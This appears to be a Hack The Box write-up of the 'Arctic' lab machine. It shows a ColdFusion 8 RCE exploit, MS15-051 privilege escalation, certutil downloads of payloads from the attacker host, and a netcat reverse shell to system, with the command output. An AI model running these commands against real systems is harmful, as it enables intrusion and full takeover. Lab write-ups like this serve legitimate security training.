---
layout: post
title: HTB Arctic Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/arctic/arctic.png
tags: [HTB]
---
![Arctic](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/arctic/arctic.png)

| Name | Arctic |
| :------ |:--- |
| OS | Windows |
| RELEASE DATE | 22 Mar 2017 |
| DIFFICULTY | Easy |

# Port Scan

From the nmap scan below there are 3 ports open. The first and last one appears to be RPC and nmap could not identify what 8500 is.

```
# Nmap 7.92 scan initiated Mon May  2 16:37:58 2022 as: nmap -p- -oN nmapScan.txt -Pn 10.10.10.11
Nmap scan report for 10.10.10.11
Host is up (0.079s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

# Nmap done at Mon May  2 16:39:46 2022 -- 1 IP address (1 host up) scanned in 107.93 seconds
                                                                                        
```

# HTTP 8500

The first thing that we can try is HTTP, because this request went through we know this is a webserver of sorts.

![Arctic](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/arctic/6feb1764625e4c19a719ecb2aa0fdb0a.png)

Poking around the file system this is running Adobe ColdFusion 8

![Arctic](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/arctic/a5aefd5bb7834e8aba7347ded85dd546.png)

Googling "Adobe ColdFusion 8 Exploit" brings us to a [python script](https://www.exploit-db.com/exploits/50057) that will give us remote code execution. Looking at the code we need to make a change to the main function, changing the `lhost` to your kali ip

```python
if __name__ == '__main__':
    # Define some information
    lhost = 'KALI IP'
    lport = 4444
    rhost = "10.10.10.11"
    rport = 8500
    filename = uuid.uuid4().hex
```

Now, let us run the exploit and from the output, we can see that it works and we get a shell!

```bash
┌──(kali㉿kali)-[~/htb/arctic]             
└─$ python3 50057.py                                                                     
                                               
Generating a payload...                                                                       
Payload size: 1496 bytes                       
Saved as: fe8145336bb4493b8aa8f4170238142b.jsp

[snip]

Printing some information for debugging...
lhost: 10.10.14.3
lport: 4444
rhost: 10.10.10.11
rport: 8500
payload: fe8145336bb4493b8aa8f4170238142b.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.11] 49300

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```

# Root

Let's do some basic system enumeration by running `systeminfo`. We can see that this is a windows server 2008 R2 server running 6.1.7600

```
C:\ColdFusion8\runtime\bin>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
```

There is a great GitHub [repo](https://github.com/SecWiki/windows-kernel-exploits) that has a collection of Windows Kernel exploits that we can use. Looking through the list MS15-051 will work on this box, and from prior knowledge this is a reliable exploit

![Arctic](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/arctic/984115b7681a4f948ce918e3b764608d.png)

We can click on this exploit and download "MS15-051-KB3045171.zip". Once it is extracted bring "ms15-051x64.exe" to our current working directory.

```
┌──(kali㉿kali)-[~/htb/arctic]
└─$ wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip

┌──(kali㉿kali)-[~/htb/arctic]
└─$ unzip MS15-051-KB3045171.zip 
Archive:  MS15-051-KB3045171.zip
   creating: MS15-051-KB3045171/
  inflating: MS15-051-KB3045171/ms15-051.exe  
  inflating: MS15-051-KB3045171/ms15-051x64.exe  
   creating: MS15-051-KB3045171/Source/
   creating: MS15-051-KB3045171/Source/ms15-051/
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.cpp  
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj  
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj.filters  
  inflating: MS15-051-KB3045171/Source/ms15-051/ms15-051.vcxproj.user  
  inflating: MS15-051-KB3045171/Source/ms15-051/ntdll.lib  
  inflating: MS15-051-KB3045171/Source/ms15-051/ntdll64.lib  
  inflating: MS15-051-KB3045171/Source/ms15-051/ReadMe.txt  
   creating: MS15-051-KB3045171/Source/ms15-051/Win32/
  inflating: MS15-051-KB3045171/Source/ms15-051/Win32/ms15-051.exe  
   creating: MS15-051-KB3045171/Source/ms15-051/x64/
  inflating: MS15-051-KB3045171/Source/ms15-051/x64/ms15-051x64.exe  
  inflating: MS15-051-KB3045171/Source/ms15-051.sln  
  inflating: MS15-051-KB3045171/Source/ms15-051.suo  

┌──(kali㉿kali)-[~/htb/arctic]
└─$ mv MS15-051-KB3045171/ms15-051x64.exe .
```

Now, let's host the exploit on a python webserver that we can use to transfer the exploit onto the machine `python3 -m http.server 80`. To transfer the file over we will go to `cd C:\Users\tolis` on the windows machine and run `certutil.exe -urlcache -f http://KALIIP/ms15-051x64.exe ms15-051x64.exe`.

```
C:\Users\tolis>certutil.exe -urlcache -f http://KALIIP/ms15-051x64.exe bad.exe                                                                                                          
certutil.exe -urlcache -f http://10.10.14.3/ms15-051x64.exe bad.exe                           
****  Online  ****                                                                            
CertUtil: -URLCache command completed successfully.
```

Now we can run this exploit and we can see that we can run commands as system!

```
C:\Users\tolis>bad.exe whoami                                                                 
bad.exe whoami
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 3992 created.
==============================
nt authority\system
```

Taking this a step further we can get a reverse shell as system with netcat.

Download a netcat binary [here](https://eternallybored.org/misc/netcat/) and then move it to our current working directory that has the python webserver running, in my case, it is `~/htb/arctic`. Once the binary is in the directory make sure the python server is still running and use `certutil.exe` to transfer it over to the box like before

```
C:\Users\tolis>certutil.exe -urlcache -f http://KALIIP/nc.exe nc.exe
certutil.exe -urlcache -f http://10.10.14.3/nc.exe nc.exe                                                                                                                                   
****  Online  ****      
CertUtil: -URLCache command completed successfully.
                                               
```

And looking at our sever we can confirm the request

```
┌──(kali㉿kali)-[~/htb/arctic]                                                               
└─$ python3 -m http.server 80                                                                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...                                     
10.10.10.11 - - [02/May/2022 17:00:08] "GET /ms15-051x64.exe HTTP/1.1" 200 -
10.10.10.11 - - [02/May/2022 17:00:09] "GET /ms15-051x64.exe HTTP/1.1" 200 -
10.10.10.11 - - [02/May/2022 17:00:46] "GET /nc.exe HTTP/1.1" 200 -         
10.10.10.11 - - [02/May/2022 17:00:47] "GET /nc.exe HTTP/1.1" 200 -
```

Now using the exploit combined with netcat we can get a reverse shell. Make sure to set up a listener on kali `nc -lvnp 4445`, then run the command below

```
C:\Users\tolis>bad.exe "nc.exe KALIIP 4445 -e cmd.exe"
bad.exe "nc.exe 10.10.14.3 4445 -e cmd.exe
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 3576 created.
==============================
```

And we can see that we are system!

```
┌──(kali㉿kali)-[~/htb/arctic]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.11] 49313
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis>whoami
nt authority\system
```
